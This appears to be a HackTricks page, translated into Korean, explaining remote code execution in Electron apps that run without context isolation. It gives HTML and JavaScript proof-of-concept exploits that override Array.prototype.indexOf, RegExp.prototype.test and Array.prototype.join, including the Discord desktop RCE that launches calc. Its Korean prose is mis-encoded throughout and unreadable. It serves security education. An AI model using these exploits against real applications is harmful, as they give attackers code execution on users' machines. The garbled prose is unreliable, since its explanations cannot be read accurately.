# Electron contextIsolation RCE via preload code

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Example 1

[https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=30)ì˜ ì˜ˆì‹œ

ì´ ì½”ë“œëŠ” ê¸°ë³¸ ë¸Œë¼ìš°ì €ë¡œ http(s) ë§í¬ë¥¼ ì—½ë‹ˆë‹¤:

![](<../../../.gitbook/assets/image (768).png>)

`file:///C:/Windows/systemd32/calc.exe`ì™€ ê°™ì€ ê²ƒì„ ì‚¬ìš©í•˜ì—¬ calcë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìœ¼ë©°, `SAFE_PROTOCOLS.indexOf`ê°€ ì´ë¥¼ ë°©ì§€í•˜ê³  ìˆìŠµë‹ˆë‹¤.

ë”°ë¼ì„œ ê³µê²©ìëŠ” XSS ë˜ëŠ” ì„ì˜ í˜ì´ì§€ íƒìƒ‰ì„ í†µí•´ ì´ JS ì½”ë“œë¥¼ ì£¼ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
```
`SAFE_PROTOCOLS.indexOf`ë¥¼ í˜¸ì¶œí•˜ë©´ í•­ìƒ 1337ì„ ë°˜í™˜í•˜ë¯€ë¡œ, ê³µê²©ìëŠ” ë³´í˜¸ë¥¼ ìš°íšŒí•˜ê³  calcë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìµœì¢… ìµìŠ¤í”Œë¡œì‡:
```html
<script>
Array.prototype.indexOf = function(){
return 1337;
}
</script>
<a href="file:///C:/Windows/systemd32/calc.exe">CLICK</a>
```
ì›ë³¸ ìŠ¬ë¼ì´ë“œë¥¼ í™•ì¸í•˜ì—¬ ê¶Œí•œ ìš”ì²­ í”„ë¡¬í”„íŠ¸ ì—†ì´ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•ì„ ì°¾ì•„ë³´ì„¸ìš”.

ëª…ë°±íˆ ì½”ë“œë¥¼ ë¡œë“œí•˜ê³  ì‹¤í–‰í•˜ëŠ” ë˜ ë‹¤ë¥¸ ë°©ë²•ì€ `file://127.0.0.1/electron/rce.jar`ì™€ ê°™ì€ ê²½ë¡œì— ì ‘ê·¼í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

## ì˜ˆì œ 2: Discord ì•± RCE

[https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1](https://mksben.l0.cm/2020/10/discord-desktop-rce.html?m=1)ì—ì„œì˜ ì˜ˆì œ

í”„ë¦¬ë¡œë“œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ í™•ì¸í•˜ëŠ” ë™ì•ˆ Discordê°€ `DiscordNative.nativeModules.requireModule('MODULE-NAME')`ë¥¼ í†µí•´ ì¼ë¶€ í—ˆìš©ëœ ëª¨ë“ˆì„ í˜¸ì¶œí•  ìˆ˜ ìˆëŠ” ê¸°ëŠ¥ì„ ì›¹ í˜ì´ì§€ì— ë…¸ì¶œí•œë‹¤ëŠ” ê²ƒì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤.\
ì—¬ê¸°ì„œ _child\_process_ ëª¨ë“ˆê³¼ ê°™ì´ RCEì— ì§ì ‘ ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ëª¨ë“ˆì€ ì‚¬ìš©í•  ìˆ˜ ì—†ì—ˆì§€ë§Œ, **JavaScript ë‚´ì¥ ë©”ì„œë“œë¥¼ ì˜¤ë²„ë¼ì´ë“œí•˜ê³  ë…¸ì¶œëœ ëª¨ë“ˆì˜ ì‹¤í–‰ì— ê°„ì„­í•¨ìœ¼ë¡œì¨ RCEë¥¼ ë‹¬ì„±í•  ìˆ˜ ìˆëŠ” ì½”ë“œë¥¼ ë°œê²¬í–ˆìŠµë‹ˆë‹¤.**

ë‹¤ìŒì€ PoCì…ë‹ˆë‹¤. **`RegExp.prototype.test`ì™€ `Array.prototype.join`ì„ ì˜¤ë²„ë¼ì´ë“œí•˜ë©´ì„œ** devToolsì—ì„œ "_discord\_utils_"ë¼ëŠ” ëª¨ë“ˆì— ì •ì˜ëœ **`getGPUDriverVersions` í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ë•Œ** **calc** ì• í”Œë¦¬ì¼€ì´ì…˜ì´ **íŒì—…**ë˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤.
```javascript
RegExp.prototype.test=function(){
return false;
}
Array.prototype.join=function(){
return "calc";
}
DiscordNative.nativeModules.requireModule('discord_utils').getGPUDriverVersions();
```
`getGPUDriverVersions` í•¨ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ì´ "_execa_" ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ì‚¬ìš©í•˜ì—¬ í”„ë¡œê·¸ë¨ì„ ì‹¤í–‰í•˜ë ¤ê³  ì‹œë„í•©ë‹ˆë‹¤.
```javascript
module.exports.getGPUDriverVersions = async () => {
if (process.platform !== 'win32') {
return {};
}

const result = {};
const nvidiaSmiPath = `${process.env['ProgramW6432']}/NVIDIA Corporation/NVSMI/nvidia-smi.exe`;

try {
result.nvidia = parseNvidiaSmiOutput(await execa(nvidiaSmiPath, []));
} catch (e) {
result.nvidia = {error: e.toString()};
}

return result;
};
```
ë³´í†µ _execa_ëŠ” `nvidiaSmiPath` ë³€ìˆ˜ì— ì§€ì •ëœ "_nvidia-smi.exe_"ë¥¼ ì‹¤í–‰í•˜ë ¤ê³  í•˜ì§€ë§Œ, ì˜¤ë²„ë¼ì´ë“œëœ `RegExp.prototype.test`ì™€ `Array.prototype.join` ë•Œë¬¸ì— **ì¸ìëŠ” \_execa**\_**ì˜ ë‚´ë¶€ ì²˜ë¦¬ì—ì„œ "**_**calc**_**"ë¡œ ëŒ€ì²´ë©ë‹ˆë‹¤**.

êµ¬ì²´ì ìœ¼ë¡œ, ì¸ìëŠ” ë‹¤ìŒ ë‘ ë¶€ë¶„ì„ ë³€ê²½í•˜ì—¬ ëŒ€ì²´ë©ë‹ˆë‹¤.

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L36)

[https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55](https://github.com/moxystudio/node-cross-spawn/blob/16feb534e818668594fd530b113a028c0c06bddc/lib/parse.js#L55)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
